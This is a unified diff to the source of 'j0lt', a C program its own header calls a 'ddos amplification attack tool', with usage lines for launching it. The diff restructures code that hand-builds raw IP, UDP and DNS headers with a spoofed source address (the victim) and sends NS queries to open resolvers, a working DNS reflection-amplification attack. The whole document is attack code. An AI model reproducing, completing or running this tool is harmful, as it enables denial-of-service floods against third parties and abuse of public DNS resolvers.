@@ -6,10 +6,10 @@
  * /\__|  |\_____  /____/__|         the-scientist:spl0its-r-us
  * \______|      \/              ddos amplification attack tool
  * ------------------------------------------------------------
- * > This is unpublished proprietary source code of spl0its-r-us
+ * This is unpublished proprietary source code of spl0its-r-us
  * the-scientist@rootstorm.com
  * ------------------------------------------------------------
- * > Usage: sudo ./j0lt -t <target> -p <port> -m <magnitude>
+ * Usage: sudo ./j0lt -t <target> -p <port> -m <magnitude>
  * (the-scientist㉿rs)-$ gcc j0lt.c -o j0lt
  * (the-scientist㉿rs)-$ sudo ./j0lt -t 127.0.0.1 -p 80 -m 1337
  * ------------------------------------------------------------
@@ -106,10 +106,6 @@ typedef struct __attribute__((packed, aligned(1))) {
 #endif
 } PSEUDOHDR;
 
-typedef struct iphdr IPHEADER;
-typedef struct udphdr UDPHEADER;
-typedef HEADER DNSHEADER;
-
 #define DEFINE_INSERT_FN(typename, datatype)           \
         bool insert_##typename                         \
         (uint8_t** buf, size_t* buflen, datatype data) \
@@ -162,18 +158,18 @@ DEFINE_INSERT_FN(qword, uint64_t)
 #define     IP_IHL_MIN_J0LT 5
 #define     IP_IHL_MAX_J0LT 15
 #define     IP_TTL_J0LT 0x40
-#define     IP_ID_J0LT 0xb00b
+#define     IP_ID_J0LT 0xc4f3
 // FLAGS
 #define     IP_RF_J0LT 0x8000 // reserved fragment flag
 #define     IP_DF_J0LT 0x4000 // dont fragment flag
 #define     IP_MF_J0LT 0x2000 // more fragments flag
-#define     IP_OF_J0LT 0x0000 // no clue what 0000 is. 
+#define     IP_OF_J0LT 0x0000 
 // END FLAGS
 #define     IP_VER_J0LT 4
 // END IPHEADER VALUES 
 
 // DNS HEADER VALUES 
-#define     DNS_ID_J0LT 0x1337
+#define     DNS_ID_J0LT 0xb4b3
 #define     DNS_QR_J0LT 0 // query (0), response (1).
 // OPCODE
 #define     DNS_OPCODE_J0LT ns_o_query
@@ -202,32 +198,26 @@ char* g_wget[ ] = {
     NULL
 };
 
+size_t
+ForgeJ0ltPacket(char* payload, uint32_t resolvip, uint32_t spoofip, uint16_t spoofport);
 bool
-InsertUDPHeader(uint8_t** buf, size_t* buflen, UDPHEADER* header, PSEUDOHDR* pseudoheader, const uint8_t* data);
-bool
-InsertIPHeader(uint8_t** buf, size_t* buflen, IPHEADER* header);
-bool
-InsertDNSHeader(uint8_t** buf, size_t* buflen, const DNSHEADER* header);
+InsertDNSHeader(uint8_t** buf, size_t* buflen);
 bool
 InsertDNSQuestion(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class);
-void
-PackDNSHeader(DNSHEADER* dnshdr);
-void
-PackUDPHeader(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, uint16_t spoofport, size_t nwritten);
-void
-PackIPHeader(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, uint32_t resolvip, uint32_t spoofip, size_t nwritten, size_t udpsz);
+bool
+InsertUDPHeader(uint8_t** buf, size_t* buflen, PSEUDOHDR* phdr, const uint8_t* data, size_t ulen, uint16_t sport);
+bool
+InsertIPHeader(uint8_t** buf, size_t* buflen, PSEUDOHDR* pheader, uint32_t daddr, uint32_t saddr, size_t ulen);
+bool
+SendPayload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t nwritten);
 bool
 InsertData(void** dst, size_t* dst_buflen, const void* src, size_t src_len);
 uint16_t
 CheckSum(const uint16_t* addr, size_t count);
-bool
-SendPayload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t nwritten);
 void
 PrintHex(void* data, size_t len);
-size_t
-ForgeJ0ltPacket(char* payload, uint32_t resolvip, uint32_t spoofip, uint16_t spoofport);
 
-#define DEBUG 0
+#define DEBUG 1
 int
 main(int argc, char** argv)
 {
@@ -315,12 +305,9 @@ ForgeJ0ltPacket(char* payload, uint32_t resolvip, uint32_t spoofip, uint16_t spo
     const char* url = ".";
     uint8_t pktbuf[ NS_PACKETSZ ], datagram[ NS_PACKETSZ ];
     uint8_t* curpos;
-    size_t buflen, nwritten, szdatagram;
+    size_t buflen, nwritten, szdatagram, udpsz;
     bool status;
 
-    UDPHEADER udpheader;
-    DNSHEADER dnsheader;
-    IPHEADER ipheader;
     PSEUDOHDR pseudoheader;
 
     buflen = NS_PACKETSZ;
@@ -328,48 +315,174 @@ ForgeJ0ltPacket(char* payload, uint32_t resolvip, uint32_t spoofip, uint16_t spo
 
     curpos = pktbuf;
     status = true;
-    PackDNSHeader(&dnsheader);
-    status &= InsertDNSHeader(&curpos, &buflen, &dnsheader);
+    status &= InsertDNSHeader(&curpos, &buflen);
     status &= InsertDNSQuestion(( void** ) &curpos, &buflen, url, ns_t_ns, ns_c_in);
 
     if (status == false)
         return 0;
 
-    nwritten = NS_PACKETSZ - buflen;
-    PackIPHeader(&ipheader, &pseudoheader, resolvip, spoofip, nwritten, sizeof(UDPHEADER));
-    PackUDPHeader(&udpheader, &pseudoheader, spoofport, nwritten);
-
     memset(datagram, 0, NS_PACKETSZ);
     curpos = datagram;
-    status &= InsertIPHeader(&curpos, &buflen, &ipheader);
-    status &= InsertUDPHeader(&curpos, &buflen, &udpheader, &pseudoheader, pktbuf);
+    udpsz = NS_PACKETSZ - buflen + sizeof(struct udphdr);
+    status &= InsertIPHeader(&curpos, &buflen, &pseudoheader, resolvip, spoofip, udpsz);
+    status &= InsertUDPHeader(&curpos, &buflen, &pseudoheader, pktbuf, udpsz, spoofport);
     if (status == false)
         return 0;
 
     szdatagram = buflen;
-    InsertData(( void** ) &curpos, &szdatagram, pktbuf, nwritten);
+    InsertData(( void** ) &curpos, &szdatagram, pktbuf, udpsz);
     nwritten = NS_PACKETSZ - buflen;
 
     memcpy(payload, datagram, nwritten);
+
     return nwritten;
 }
 
-
-void
-PrintHex(void* data, size_t len)
+bool
+InsertDNSHeader(uint8_t** buf, size_t* buflen)
 {
-    const uint8_t* d = ( const uint8_t* ) data;
-    size_t i, j;
-    for (j = 0, i = 0; i < len; i++) {
-        if (i % 16 == 0) {
-            printf("\n0x%.4x: ", j);
-            j += 16;
+    bool status;
+    uint8_t third_byte, fourth_byte;
+
+    third_byte = (
+        DNS_RD_J0LT |
+        DNS_TC_J0LT << 1 |
+        DNS_AA_J0LT << 2 |
+        DNS_OPCODE_J0LT << 3 |
+        DNS_QR_J0LT << 7
+    );
+
+    fourth_byte = (
+        DNS_RCODE_J0LT |
+        DNS_CD_J0LT << 4 |
+        DNS_AD_J0LT << 5 |
+        DNS_Z_J0LT << 6 |
+        DNS_RA_J0LT << 7
+    );
+
+    status = true;
+    status &= insert_word(buf, buflen, DNS_ID_J0LT);
+
+    status &= insert_byte(buf, buflen, third_byte);
+    status &= insert_byte(buf, buflen, fourth_byte);
+
+    status &= insert_word(buf, buflen, DNS_QDCOUNT_J0LT);
+    status &= insert_word(buf, buflen, DNS_ANCOUNT_J0LT);
+    status &= insert_word(buf, buflen, DNS_NSCOUNT_J0LT);
+    status &= insert_word(buf, buflen, DNS_ARCOUNT_J0LT);
+
+    return status;
+}
+
+
+bool
+InsertDNSQuestion(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class)
+{
+    const char* token;
+    char* saveptr, qname[ NS_PACKETSZ ];
+    size_t srclen, domainlen, dif;
+    bool status;
+
+    dif = *buflen;
+    domainlen = strlen(domain) + 1;
+    if (domainlen > NS_PACKETSZ - 1)
+        return false;
+
+    memcpy(qname, domain, domainlen);
+    if (qname[ 0 ] != '.') {
+        token = strtok_r(qname, ".", &saveptr);
+        if (token == NULL)
+            return false;
+        while (token != NULL) {
+            srclen = strlen(token);
+            insert_byte(( uint8_t** ) buf, buflen, srclen);
+            InsertData(buf, buflen, token, srclen);
+            token = strtok_r(NULL, ".", &saveptr);
         }
-        if (i % 2 == 0)
-            putchar(' ');
-        printf("%.2x", d[ i ]);
     }
-    putchar('\n');
+
+    status = true;
+    status &= insert_byte(( uint8_t** ) buf, buflen, 0x00);
+    status &= insert_word(( uint8_t** ) buf, buflen, query_type);
+    status &= insert_word(( uint8_t** ) buf, buflen, query_class);
+
+    dif -= *buflen;
+    if (dif % 2 != 0) // pad
+        status &= insert_byte(( uint8_t** ) buf, buflen, 0x00);
+
+    return status;
+}
+
+
+bool
+InsertUDPHeader(uint8_t** buf, size_t* buflen, PSEUDOHDR* phdr, const uint8_t* data, size_t ulen, uint16_t sport)
+{
+    bool status;
+    size_t totalsz = sizeof(PSEUDOHDR) + ulen;
+    size_t datasz = abs(ulen - sizeof(struct udphdr));
+    size_t udpsofar;
+    uint16_t checksum;
+    uint8_t pseudo[ totalsz ];
+    uint8_t* pseudoptr = pseudo;
+
+    status = true;
+    status &= insert_word(buf, buflen, sport);
+    status &= insert_word(buf, buflen, NS_DEFAULTPORT);
+    status &= insert_word(buf, buflen, ( uint16_t ) ulen);
+    udpsofar = sizeof(struct udphdr) - 2;
+
+    memset(pseudo, 0, totalsz);
+    insert_dword(&pseudoptr, &totalsz, phdr->sourceaddr);
+    insert_dword(&pseudoptr, &totalsz, phdr->destaddr);
+    insert_byte(&pseudoptr, &totalsz, phdr->zero);
+    insert_byte(&pseudoptr, &totalsz, phdr->protocol);
+    insert_word(&pseudoptr, &totalsz, sizeof(struct udphdr));
+
+    *buf -= udpsofar;
+    InsertData(( void** ) &pseudoptr, ( void* ) &totalsz, *buf, udpsofar + 2);
+    *buf += udpsofar;
+    InsertData(( void** ) &pseudoptr, ( void* ) &totalsz, data, datasz);
+    checksum = CheckSum(( uint16_t* ) pseudo, sizeof(PSEUDOHDR) + ulen);
+    checksum -= datasz; // wtf... 
+    status &= insert_word(buf, buflen, checksum);
+
+    return status;
+}
+
+
+bool
+InsertIPHeader(uint8_t** buf, size_t* buflen, PSEUDOHDR* pheader, uint32_t daddr, uint32_t saddr, size_t ulen)
+{
+    bool status;
+    uint8_t* bufptr = *buf;
+    uint8_t first_byte;
+    uint16_t checksum;
+
+    status = true;
+    first_byte = IP_VER_J0LT << 4 | IP_IHL_MIN_J0LT;
+    status &= insert_byte(buf, buflen, first_byte);
+    status &= insert_byte(buf, buflen, 0x00); // TOS
+    status &= insert_word(buf, buflen, (IP_IHL_MIN_J0LT << 2) + ulen); // total len 
+    status &= insert_word(buf, buflen, IP_ID_J0LT);
+    status &= insert_word(buf, buflen, IP_OF_J0LT);
+    status &= insert_byte(buf, buflen, IP_TTL_J0LT);
+    status &= insert_byte(buf, buflen, getprotobyname("udp")->p_proto);
+    status &= insert_word(buf, buflen, 0x0000);
+    status &= insert_dword(buf, buflen, saddr);
+    status &= insert_dword(buf, buflen, daddr);
+
+    checksum = CheckSum(( const uint16_t* ) bufptr, ( size_t ) (IP_IHL_MIN_J0LT << 2));
+    *buf -= 0xa;
+    *(*buf)++ = (checksum & 0xff00) >> 8;
+    **buf = checksum & 0xff;
+    *buf += 9;
+
+    memset(pheader, 0, sizeof(PSEUDOHDR));
+    pheader->protocol = getprotobyname("udp")->p_proto;
+    pheader->destaddr = daddr;
+    pheader->sourceaddr = saddr;
+
+    return status;
 }
 
 
@@ -406,209 +519,6 @@ SendPayload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t n
 }
 
 
-void
-PackIPHeader(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, uint32_t resolvip, uint32_t spoofip, size_t nwritten, size_t udpsz)
-{
-    memset(iphdr, 0, sizeof(IPHEADER));
-    iphdr->version = IP_VER_J0LT;
-    iphdr->ihl = IP_IHL_MIN_J0LT;
-    iphdr->tot_len = (iphdr->ihl << 2) + udpsz + nwritten;
-    iphdr->id = IP_ID_J0LT;
-    iphdr->frag_off = IP_OF_J0LT;
-    iphdr->ttl = IP_TTL_J0LT;
-    iphdr->protocol = getprotobyname("udp")->p_proto;
-    iphdr->saddr = spoofip; // spoofed ip address to victim
-    iphdr->daddr = resolvip; // open resvoler 
-    memset(pseudohdr, 0, sizeof(PSEUDOHDR));
-    pseudohdr->protocol = iphdr->protocol;
-    pseudohdr->destaddr = iphdr->daddr;
-    pseudohdr->sourceaddr = iphdr->saddr;
-}
-
-
-void
-PackUDPHeader(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, uint16_t spoofport, size_t nwritten)
-{
-    memset(udphdr, 0, sizeof(UDPHEADER));
-    udphdr->uh_dport = NS_DEFAULTPORT; // nameserver port
-    udphdr->uh_sport = spoofport;    // victim port
-    udphdr->uh_ulen = nwritten + sizeof(UDPHEADER);
-
-    pseudohdr->udplen = sizeof(UDPHEADER);
-}
-
-
-void
-PackDNSHeader(DNSHEADER* dnshdr)
-{
-    memset(dnshdr, 0, sizeof(DNSHEADER));
-    dnshdr->id = DNS_ID_J0LT;
-    dnshdr->rd = DNS_RD_J0LT;
-    dnshdr->tc = DNS_TC_J0LT;
-    dnshdr->aa = DNS_AA_J0LT;
-    dnshdr->opcode = DNS_OPCODE_J0LT;
-    dnshdr->qr = DNS_QR_J0LT;
-    dnshdr->rcode = DNS_RCODE_J0LT;
-    dnshdr->cd = DNS_CD_J0LT;
-    dnshdr->ad = DNS_AD_J0LT;
-    dnshdr->unused = DNS_Z_J0LT;
-    dnshdr->ra = DNS_RA_J0LT;
-    dnshdr->qdcount = DNS_QDCOUNT_J0LT;
-    dnshdr->ancount = DNS_ANCOUNT_J0LT;
-    dnshdr->nscount = DNS_NSCOUNT_J0LT;
-    dnshdr->arcount = DNS_ARCOUNT_J0LT;
-}
-
-
-bool
-InsertIPHeader(uint8_t** buf, size_t* buflen, IPHEADER* header)
-{
-    bool status;
-    uint8_t* bufptr = *buf;
-    uint8_t first_byte;
-
-    status = true;
-    first_byte = header->version << 4 | header->ihl;
-    status &= insert_byte(buf, buflen, first_byte);
-    status &= insert_byte(buf, buflen, header->tos);
-    status &= insert_word(buf, buflen, header->tot_len);
-    status &= insert_word(buf, buflen, header->id);
-    status &= insert_word(buf, buflen, header->frag_off);
-    status &= insert_byte(buf, buflen, header->ttl);
-    status &= insert_byte(buf, buflen, header->protocol);
-    status &= insert_word(buf, buflen, header->check);
-    status &= insert_dword(buf, buflen, header->saddr);
-    status &= insert_dword(buf, buflen, header->daddr);
-
-    header->check = CheckSum(( const uint16_t* ) bufptr, ( size_t ) header->ihl << 2);
-    *buf -= 0xa;
-    *(*buf)++ = (header->check & 0xff00) >> 8;
-    **buf = header->check & 0xff;
-    *buf += 9;
-
-    return status;
-}
-
-
-bool
-InsertUDPHeader(uint8_t** buf, size_t* buflen, UDPHEADER* header, PSEUDOHDR* pseudoheader, const uint8_t* data)
-{
-    bool status;
-    size_t totalsz =
-        sizeof(PSEUDOHDR) + header->uh_ulen;
-    size_t datasz =
-        abs(header->uh_ulen - sizeof(UDPHEADER));
-    size_t udpsofar;
-    uint8_t pseudo[ totalsz ];
-    uint8_t* pseudoptr = pseudo;
-
-    status = true;
-    status &= insert_word(buf, buflen, header->uh_sport);
-    status &= insert_word(buf, buflen, header->uh_dport);
-    status &= insert_word(buf, buflen, header->uh_ulen);
-    udpsofar = sizeof(UDPHEADER) - 2;
-
-    memset(pseudo, 0, totalsz);
-    insert_dword(&pseudoptr, &totalsz, pseudoheader->sourceaddr);
-    insert_dword(&pseudoptr, &totalsz, pseudoheader->destaddr);
-    insert_byte(&pseudoptr, &totalsz, pseudoheader->zero);
-    insert_byte(&pseudoptr, &totalsz, pseudoheader->protocol);
-    insert_word(&pseudoptr, &totalsz, pseudoheader->udplen);
-
-    *buf -= udpsofar;
-    InsertData(( void** ) &pseudoptr, ( void* ) &totalsz, *buf, udpsofar + 2);
-    *buf += udpsofar;
-    InsertData(( void** ) &pseudoptr, ( void* ) &totalsz, data, datasz);
-    header->uh_sum =
-        CheckSum(( uint16_t* ) pseudo,
-        sizeof(PSEUDOHDR) + header->uh_ulen
-        );
-
-    header->uh_sum -= datasz; // wtf... 
-    status &= insert_word(buf, buflen, header->uh_sum);
-
-    return status;
-}
-
-
-bool
-InsertDNSHeader(uint8_t** buf, size_t* buflen, const HEADER* header)
-{
-    bool status;
-    uint8_t third_byte, fourth_byte;
-
-    third_byte = (
-        header->rd |
-        header->tc << 1 |
-        header->aa << 2 |
-        header->opcode << 3 |
-        header->qr << 7
-    );
-
-    fourth_byte = (
-        header->rcode |
-        header->cd << 4 |
-        header->ad << 5 |
-        header->unused << 6 |
-        header->ra << 7
-    );
-
-    status = true;
-    status &= insert_word(buf, buflen, header->id);
-
-    status &= insert_byte(buf, buflen, third_byte);
-    status &= insert_byte(buf, buflen, fourth_byte);
-
-    status &= insert_word(buf, buflen, header->qdcount);
-    status &= insert_word(buf, buflen, header->ancount);
-    status &= insert_word(buf, buflen, header->nscount);
-    status &= insert_word(buf, buflen, header->arcount);
-
-    return status;
-}
-
-
-bool
-InsertDNSQuestion(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class)
-{
-    const char* token;
-    char* saveptr, qname[ NS_PACKETSZ ];
-    size_t srclen, domainlen, dif;
-    bool status;
-
-    dif = *buflen;
-    domainlen = strlen(domain) + 1;
-    if (domainlen > NS_PACKETSZ - 1)
-        return false;
-
-    memcpy(qname, domain, domainlen);
-    if (qname[ 0 ] != '.') {
-        token = strtok_r(qname, ".", &saveptr);
-        if (token == NULL) {
-            return false;
-        }
-        while (token != NULL) {
-            srclen = strlen(token);
-            insert_byte(( uint8_t** ) buf, buflen, srclen);
-            InsertData(buf, buflen, token, srclen);
-            token = strtok_r(NULL, ".", &saveptr);
-        }
-    }
-
-    status = true;
-    status &= insert_byte(( uint8_t** ) buf, buflen, 0x00);
-    status &= insert_word(( uint8_t** ) buf, buflen, query_type);
-    status &= insert_word(( uint8_t** ) buf, buflen, query_class);
-
-    dif -= *buflen;
-    if (dif % 2 != 0) { // pad
-        status &= insert_byte(( uint8_t** ) buf, buflen, 0x00);
-    }
-
-    return status;
-}
-
-
 bool
 InsertData(void** dst, size_t* dst_buflen, const void* src, size_t src_len)
 {
@@ -640,4 +550,22 @@ CheckSum(const uint16_t* addr, size_t count)
         sum = (sum & 0xffff) + (sum >> 16);
 
     return ~(( uint16_t ) ((sum << 8) | (sum >> 8)));
+}
+
+
+void
+PrintHex(void* data, size_t len)
+{
+    const uint8_t* d = ( const uint8_t* ) data;
+    size_t i, j;
+    for (j = 0, i = 0; i < len; i++) {
+        if (i % 16 == 0) {
+            printf("\n0x%.4x: ", j);
+            j += 16;
+        }
+        if (i % 2 == 0)
+            putchar(' ');
+        printf("%.2x", d[ i ]);
+    }
+    putchar('\n');
 }
